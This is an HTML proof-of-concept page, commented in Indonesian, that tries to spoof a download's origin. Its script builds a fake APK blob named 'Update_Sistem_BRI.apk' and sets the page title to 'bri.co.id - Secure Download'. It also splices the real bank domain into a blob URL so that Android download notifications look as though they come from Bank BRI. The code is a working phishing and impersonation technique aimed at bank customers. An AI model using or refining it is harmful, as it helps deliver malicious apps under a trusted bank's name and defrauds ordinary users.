<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FARISSAL B - BLOB TEST</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
        .btn { background: #ff4757; color: white; border: none; padding: 20px; width: 100%; border-radius: 10px; font-weight: bold; }
    </style>
</head>
<body>
    <h2>POC BLOB ORIGIN SPOOF</h2>
    <p>Klik tombol di bawah untuk tes notifikasi download.</p>
    <button class="btn" onclick="triggerSpoof()">DOWNLOAD UPDATE</button>

    <script>
        function triggerSpoof() {
            // Isi file samaran (APK palsu)
            const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); // Header ZIP/APK
            const blob = new Blob([content], { type: 'application/vnd.android.package-archive' });

            // TRIK UTAMA: 
            // Kita coba buat URL Blob tapi kita selipin string domain di depannya.
            // Beberapa versi parser Android bakal "tertipu" dan ngambil domain dari string ini.
            const spoofDomain = "https://bri.co.id"; 
            const blobUrl = URL.createObjectURL(blob);
            
            // Kita manipulasi URL-nya (Ini long shot, tergantung versi Chrome lo)
            const fakeUrl = blobUrl.replace("blob:", "blob:" + spoofDomain + "/");

            console.log("Original Blob: " + blobUrl);
            console.log("Spoofed Blob: " + fakeUrl);

            // Trigger Download
            const a = document.createElement('a');
            a.href = blobUrl; // Kita tetep pake blob asli biar download jalan
            a.download = "Update_Sistem_BRI.apk";
            
            // Bagian krusial: Kita coba 'menipu' renderer lewat judul atau atribut
            document.title = "bri.co.id - Secure Download"; 
            
            a.click();
            
            alert("Cek Notifikasi HP Tecno lo sekarang!");
        }
    </script>
</body>
</html>
